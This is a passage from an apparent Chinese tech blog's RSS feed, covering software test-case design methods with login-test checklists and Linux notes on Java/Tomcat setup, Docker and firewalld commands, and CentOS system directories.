&lt;h3 id=&#34;b边界值设计法&#34;&gt;b.边界值设计法&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;解释&lt;/strong&gt;：边界值分析法就是对输入或者输出的边界值进行测试的一种黑盒测试方法，通常边界值分析法是作为对等价类划分方法的补充，这种情况下，测试用例来自等价类的边界&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ex: 输入框长度为1-11，边界值取值：0，1，11，12&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运动员参赛项目为1-3项，边界值取值：0项，1项，3项，4项&lt;/li&gt;
&lt;li&gt;查询面页面有999行，每50行为一页，边界值取值：0行，1行，50行，51行，999行&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;c因果图设计法&#34;&gt;c.因果图设计法&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;解释&lt;/strong&gt;：因果图是一种简化的逻辑图，能直观的表明程序输入条件(原因)和输出动作(结果)间的相互关系。因此，因果图法特别适用于被测试程序具有多种输入条件，程序的输出又依赖于输入条件的情况&lt;/p&gt;
&lt;p&gt;因果图设计测试用例的步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分析所有可能的输入和可能的输出&lt;/li&gt;
&lt;li&gt;找出输入与输出之间的关系&lt;/li&gt;
&lt;li&gt;画出因果图&lt;/li&gt;
&lt;li&gt;把因果图转化成判定表&lt;/li&gt;
&lt;li&gt;把判定表对应到每一个测试用例&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ex：淘宝在双十一退出打折优惠活动，订单已提交，订单金额大于300或有红包，则优惠&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.首先通过分析所有可能的输入和可能的输出，可以得到如下结果：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;输入：订单已提交，订单金额大于300，有红包&lt;/li&gt;
&lt;li&gt;输出：优惠，不优惠&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2.然后进行第二步，找出输入域输出之间的关系，通过分析得出以下对应关系&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;订单已提交，订单金额大于300，则优惠&lt;/li&gt;
&lt;li&gt;订单已提交，订单金额小于等于300，无红包，不优惠&lt;/li&gt;
&lt;li&gt;订单已提交，订单金额小于等于300，有红包，优惠&lt;/li&gt;
&lt;li&gt;订单已提交，有红包，优惠&lt;/li&gt;
&lt;li&gt;订单未提交，不优惠&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3.为了方便画出因果图和判定图，对所有输入和输出编号&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1：订单已提交&lt;/li&gt;
&lt;li&gt;2：订单金额大于300&lt;/li&gt;
&lt;li&gt;3：有红包&lt;/li&gt;
&lt;li&gt;21：优惠&lt;/li&gt;
&lt;li&gt;23：不优惠&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;4.画因果图，画判定表，得测试用例&lt;/p&gt;
&lt;h3 id=&#34;d正交法&#34;&gt;d.正交法&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;解释&lt;/strong&gt;：正交法的目的在于减少用例数量，使用尽量少的用例，覆盖输入的两两组合&lt;/p&gt;
&lt;p&gt;正交法设计测试用例的步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分析有哪些因素（变量）&lt;/li&gt;
&lt;li&gt;每个因素有哪几个水平（变量的取值）&lt;/li&gt;
&lt;li&gt;选择一个合适的正交表&lt;/li&gt;
&lt;li&gt;把变量的值映射到表中&lt;/li&gt;
&lt;li&gt;把每一行的各因素水平的组合作为一个测试用例&lt;/li&gt;
&lt;li&gt;加上你认为可疑且没有在表中出现的用例组合&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ex：用户注册&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.因素：姓名，邮箱，密码，确认密码，验证码&lt;/p&gt;
&lt;p&gt;2.水平：填写，不填写&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291721415.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291721415.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;3.计算：表中的因素数 C=5，表中至每个因素数的水平数 T=2，行数取最少的一个，即试验次数 ( N ) 最少的一个，试验次数公式 &lt;code&gt;L=N(TC)=(2-1)*5+1=6(25)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;4.生成测试用例&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291722792.jpg&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291722792.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;e场景设计法&#34;&gt;e.场景设计法&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;解释&lt;/strong&gt;：现在的软件程序几乎都是使用事件触发来控制流程。事件触发时形成场景，同一事件不同的触发顺序和不同的处理结果就形成事件流。场景设计法可以生动地描绘出事件触发时的情景，有利于测试用例更容易理解和执行&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ex：用户注册&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;事件流：开始—&amp;gt;用户注册—&amp;gt;用户阅读协议—&amp;gt;是否同意协议—是—&amp;gt;填写信息—&amp;gt;发送验证信息—&amp;gt;激活—&amp;gt;注册成功—&amp;gt;结束&lt;/p&gt;
&lt;h3 id=&#34;f错误猜测法&#34;&gt;f.错误猜测法&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;解释&lt;/strong&gt;：基于经验和直觉，找出程序中你认为会出现的错误，有针对性地设计测试用例。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ex：用户注册&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;移除和替换输入中的特殊字符和空格&lt;/li&gt;
&lt;li&gt;正确识别密码中的大小写&lt;/li&gt;
&lt;li&gt;密码发送不应该使用明文&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;5一些示例&#34;&gt;5.一些示例&lt;/h2&gt;
&lt;p&gt;登录功能的测试用例设计&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;功能测试：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;输入正确的账号和密码，点击提交按钮，能正常登录；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入错误的账号或错误的密码，登录失败，有相应的提示信息；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;登录成功后能跳转到正确的页面；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;账号和密码，如果太短或者太长，禁止提交，提示修改密码（密码安全性检测）；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;账号和密码中有特殊字符（如空格），和其他非英文的情况，传输时进行过滤；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;账号和密码前后有空格时，传输时自动过滤；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;密码不以明文显示（星号、圆点等）；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;验证码文字不扭曲过度，辨认难度不大，刷新正常；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入密码时，若大写键盘开启，应当出现提示；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不输入任何内容，点击提交按钮，提示信息空输入，禁止提交（非空校验）；&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;UI测试：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;布局合理，文字和按钮正确排列；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文本输入框和按钮的长度，高度符合要求；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;界面的设计风格与UI的设计风格统一；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;界面中的文字简洁易懂，没有错别字；&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;安全性测试：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;登录成功后生成的 Cookie 有 HttpOnly（ 如果 Cookie 中设置了 HttpOnly 属性，那么将无法通过 JavaScript 读取，能有效的防止 Cookie 被窃取，增加Cookie 的安全性 ）；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;账号和密码通过 POST 并加密的方式，发送给 Web 服务器；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;账号和密码的验证，应该是用服务器端验证，而不能单单是在客户端用 JavaScript 验证；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;账号和密码的输入框，应该屏蔽 SQL 注入攻击；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;账号和密码的输入框，应该禁止输入脚本；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;存在错误登录的次数限制（ 防止暴力破解 ）；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;支持多用户在同一机器上登录；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;单用户在多台机器上允许登录；&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;可用性测试：&lt;/strong&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;输入账号，密码后按回车，可以登录；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入框可以使用 Tab 键切换；&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;兼容性测试：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;各种主流的浏览器下能显示正常（ IE，Firefox，Chrome，Edge ）；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;移动设备上能正常工作；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不同的分辨率下显示正常；&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>Linux—Java 与 Tomcat 的配置</title>
        <link>https://ac-lm.github.io/posts/linux/linuxjava-%E4%B8%8E-tomcat-%E7%9A%84%E9%85%8D%E7%BD%AE/</link>
        <pubDate>Thu, 22 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxjava-%E4%B8%8E-tomcat-%E7%9A%84%E9%85%8D%E7%BD%AE/</guid>
        <description>&lt;h2 id=&#34;1java-配置&#34;&gt;1.Java 配置&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 查看内核&lt;/span&gt;
arch
uname -a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.oracle.com/java/technologies/javase-downloads.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; JDK 官网下载 &lt;/a&gt;  注意跟随内核版本，ARM下ARM，x86下x86，下载源码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 删除自带的openjava&lt;/span&gt;
rpm -qa | grep java
yum -y remove openjava
&lt;span style=&#34;color:#75715e&#34;&gt;# 配置环境变量&lt;/span&gt;
vim /etc/profile &lt;span style=&#34;color:#75715e&#34;&gt;#编辑vi&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 添加以下内容&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# This is Java:&lt;/span&gt;
JAVA_HOME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/home/ams/jdk
PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$PATH:&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;JAVA_HOME&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;/bin
export JAVA_HOME PATH
source /etc/profile &lt;span style=&#34;color:#75715e&#34;&gt;#启用环境 配置后启动环境，若配置环境后无法使用Java，需运行此命令&lt;/span&gt;
Java -version
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2tomcat-配置&#34;&gt;2.Tomcat 配置&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tomcat.apache.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Tomcat 官网下载 &lt;/a&gt;  注意跟随内核版本，下载源码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 环境变量&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 建议定义在单个tomcat的启动和关闭程序，避免影响&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 打开startup.sh和shutdown.sh，添加以下内容&lt;/span&gt;
export TOMCAT_HOME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/home/ams/tomcat
export CATALINA_HOME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/home/ams/tomcat
export PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$PATH:/home/ams/tomcat/bin
&lt;span style=&#34;color:#75715e&#34;&gt;#--------------------------------------&lt;/span&gt;
/bin/bash startup.sh &lt;span style=&#34;color:#75715e&#34;&gt;#运行tomcat&lt;/span&gt;
ps -ef | grep tomcat &lt;span style=&#34;color:#75715e&#34;&gt;#是否安装tomcat&lt;/span&gt;
root       &lt;span style=&#34;color:#ae81ff&#34;&gt;3905&lt;/span&gt; 13.0  2.3 &lt;span style=&#34;color:#ae81ff&#34;&gt;5052592&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;124264&lt;/span&gt; pts/0  Sl   10:59   0:03 /home/ams/jdk/bin/java -Djava.util.logging.config.file&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/home/ams/tomcat/conf/logging.properties -Djava.util.logging.manager&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; -Djava.protocol.handler.pkgs&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0027&lt;/span&gt; -Dignore.endorsed.dirs&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; -classpath /home/ams/tomcat/bin/bootstrap.jar:/home/ams/tomcat/bin/tomcat-juli.jar -Dcatalina.base&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/home/ams/tomcat -Dcatalina.home&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/home/ams/tomcat -Djava.io.tmpdir&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/home/ams/tomcat/temp org.apache.catalina.startup.Bootstrap start
root       &lt;span style=&#34;color:#ae81ff&#34;&gt;4003&lt;/span&gt;  0.0  0.0 &lt;span style=&#34;color:#ae81ff&#34;&gt;112824&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;976&lt;/span&gt; pts/0    S+   11:00   0:00 grep --color&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;auto tomcat
&lt;span style=&#34;color:#75715e&#34;&gt;#----------------------------------------&lt;/span&gt;
浏览器打开 IP:8080
将Html文件放置在Tomcat目录下webapps文件夹内，访问相应地址如192.168.204.129:8080/Apage/Menu.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—Docker 与防火墙</title>
        <link>https://ac-lm.github.io/posts/linux/linuxdocker-%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99/</link>
        <pubDate>Fri, 16 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxdocker-%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99/</guid>
        <description>&lt;h2 id=&#34;1docker操作&#34;&gt;1.docker操作&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;uname -r &lt;span style=&#34;color:#75715e&#34;&gt;# 查看内核信息&lt;/span&gt;
yum list installed | grep docker &lt;span style=&#34;color:#75715e&#34;&gt;# 查找docker是否安装&lt;/span&gt;
yum -y install docker  &lt;span style=&#34;color:#75715e&#34;&gt;# 下载安装docker&lt;/span&gt;
systemctl start docker &lt;span style=&#34;color:#75715e&#34;&gt;# 运行docker&lt;/span&gt;
systemctl status docker &lt;span style=&#34;color:#75715e&#34;&gt;# 查看docker状态&lt;/span&gt;
systemctl enable docker  &lt;span style=&#34;color:#75715e&#34;&gt;# 自启动docker&lt;/span&gt;
docker version &lt;span style=&#34;color:#75715e&#34;&gt;# docker版本&lt;/span&gt;
docker ps -a &lt;span style=&#34;color:#75715e&#34;&gt;# 查看docker安装的服务&lt;/span&gt;
docker start services &lt;span style=&#34;color:#75715e&#34;&gt;# docker运行服务&lt;/span&gt;
docker rm -f docker_name &lt;span style=&#34;color:#75715e&#34;&gt;# 强制删除&lt;/span&gt;
docker exec service_ip/docker_id ping www.baidu.com &lt;span style=&#34;color:#75715e&#34;&gt;# 联网查看&lt;/span&gt;
docker exec -it docker_id /bin/bash &lt;span style=&#34;color:#75715e&#34;&gt;# 进入容器 &lt;/span&gt;
docker rename new_name old_name &lt;span style=&#34;color:#75715e&#34;&gt;# 重命名&lt;/span&gt;
docker images
docker rmi image
docker export docker_id &amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/backups.tar
exit &lt;span style=&#34;color:#75715e&#34;&gt;# 退出&lt;/span&gt;
docker stop &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;docker ps -q&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 停用全部运行中的容器&lt;/span&gt;
docker rm &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;docker ps -aq&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 删除全部容器 &lt;/span&gt;
docker cp container：container_file backups_file &lt;span style=&#34;color:#75715e&#34;&gt;# 复制文件&lt;/span&gt;
docker run --name python3.9 --privileged&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true -v /root/pythonScript:/pythonScript -it python /bin/bash &lt;span style=&#34;color:#75715e&#34;&gt;# 运行文件&lt;/span&gt;
docker exec id commend
docker inspect --format&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;docker ps -aq&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 查看容器 IP&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2防火墙操作&#34;&gt;2.防火墙操作&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cd /etc/firewalld/zones &lt;span style=&#34;color:#75715e&#34;&gt;# 查看防火墙文件&lt;/span&gt;
firewall-cmd --zone&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;public --add-port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8080/tcp --permanent &lt;span style=&#34;color:#75715e&#34;&gt;# 开放8080/tcp端口 （--permanent永久生效，没有此参数重启后失效）&lt;/span&gt;
firewall-cmd --zone&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;public --remove-port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;8080/tcp --permanent &lt;span style=&#34;color:#75715e&#34;&gt;# 关闭8080/tcp端口&lt;/span&gt;
firewall-cmd --zone&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;public --query-port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;80/tcp &lt;span style=&#34;color:#75715e&#34;&gt;# 查看端口状态&lt;/span&gt;
firewall-cmd --reload &lt;span style=&#34;color:#75715e&#34;&gt;# 重启防火墙&lt;/span&gt;
firewall-cmd --completely-reload
firewall-cmd --list-all &lt;span style=&#34;color:#75715e&#34;&gt;# 列出防火墙所以规则&lt;/span&gt;
firewall-cmd --list-ports &lt;span style=&#34;color:#75715e&#34;&gt;# 列出防火墙开放的端口&lt;/span&gt;
firewall-cmd --version &lt;span style=&#34;color:#75715e&#34;&gt;# 查看版本： &lt;/span&gt;
firewall-cmd --help
firewall-cmd --state
firewall-cmd --panic-on &lt;span style=&#34;color:#75715e&#34;&gt;# 拒绝所有包：&lt;/span&gt;
firewall-cmd --panic-off &lt;span style=&#34;color:#75715e&#34;&gt;# 取消拒绝状态： &lt;/span&gt;
firewall-cmd --query-panic &lt;span style=&#34;color:#75715e&#34;&gt;# 查看是否拒绝： &lt;/span&gt;
firewall-cmd --zone&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;docs --add-port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;40000-45000/tcp --permanent &lt;span style=&#34;color:#75715e&#34;&gt;# 批量开放端口，打开从40000到45000之间的所有端口&lt;/span&gt;
firewall-cmd --zone&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;docs --remove-port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;40000-45000/tcp --permanent &lt;span style=&#34;color:#75715e&#34;&gt;# 批量关闭端口，关闭从40000到45000之间的所有端口&lt;/span&gt;
firewall-cmd --zone&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;work --add-service&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;smtp  &lt;span style=&#34;color:#75715e&#34;&gt;# 添加服务&lt;/span&gt;
firewall-cmd --zone&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;work --query-service&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;smtp  &lt;span style=&#34;color:#75715e&#34;&gt;# 查看服务&lt;/span&gt;
firewall-cmd --zone&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;work --remove-service&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;smtp  &lt;span style=&#34;color:#75715e&#34;&gt;# 删除服务&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#-------------------------------------------------------&lt;/span&gt;
systemctl stop firewalld &lt;span style=&#34;color:#75715e&#34;&gt;# 关闭防火墙&lt;/span&gt;
systemctl start firewalld &lt;span style=&#34;color:#75715e&#34;&gt;# 开启防火墙&lt;/span&gt;
systemctl status firewalld &lt;span style=&#34;color:#75715e&#34;&gt;# 防火墙状态&lt;/span&gt;
systemctl stop firewalld &lt;span style=&#34;color:#75715e&#34;&gt;# 停止&lt;/span&gt;
systemctl disable firewalld &lt;span style=&#34;color:#75715e&#34;&gt;# 开机禁用&lt;/span&gt;
systemctl enable firewalld &lt;span style=&#34;color:#75715e&#34;&gt;# 开机启动&lt;/span&gt;
yum install firewalld &lt;span style=&#34;color:#75715e&#34;&gt;# 安装&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—系统文件</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6/</link>
        <pubDate>Thu, 15 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6/</guid>
        <description>&lt;p&gt;&amp;mdash;&amp;mdash;&amp;ndash; 基于发行版本 CentOS-7 &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;&lt;/p&gt;
&lt;h2 id=&#34;1linux的镜像分类&#34;&gt;1.Linux的镜像分类&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CentOS-7.0-x86_64-DVD-1503-01.iso : 标准安装版&lt;/li&gt;
&lt;li&gt;CentOS-7.0-x86_64-NetInstall-1503-01.iso : 网络安装镜像&lt;/li&gt;
&lt;li&gt;CentOS-7.0-x86_64-Everything-1503-01.iso: 对完整版安装盘的软件进行补充，集成所有软件&lt;/li&gt;
&lt;li&gt;CentOS-7.0-x86_64-GnomeLive-1503-01.iso: GNOME 桌面版&lt;/li&gt;
&lt;li&gt;CentOS-7.0-x86_64-KdeLive-1503-01.iso: KDE 桌面版&lt;/li&gt;
&lt;li&gt;CentOS-7.0-x86_64-livecd-1503-01.iso : 光盘上运行的系统，类拟于 WindowsPE&lt;/li&gt;
&lt;li&gt;CentOS-7.0-x86_64-minimal-1503-01.iso : 精简版，自带的软件最少&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2linux系统目录&#34;&gt;2.Linux系统目录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;/bin&lt;/strong&gt;：bin 是 Binaries（二进制文件）的缩写，这个目录存放着最经常使用的命令。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/boot&lt;/strong&gt;：这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/dev&lt;/strong&gt;：dev 是 Device（设备）的缩写，该目录存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/etc&lt;/strong&gt;：etc 是 Etcetera 这个目录用来存放所有的系统管理所需要的配置文件和子目录。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/home&lt;/strong&gt;：用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/lib&lt;/strong&gt;：lib 是 Library（库）的缩写，这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/lost+found&lt;/strong&gt;：这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/media&lt;/strong&gt;：linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/mnt&lt;/strong&gt;：系统提供给用户临时挂载别的文件系统的目录，我们可以将光驱挂载在 /mnt/ 上，然后进入该目录查看光驱里的内容&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/opt&lt;/strong&gt;：opt 是 optional（可选）的缩写，这是给主机额外安装软件所摆放的目录。默认是空的。&lt;/li&gt;
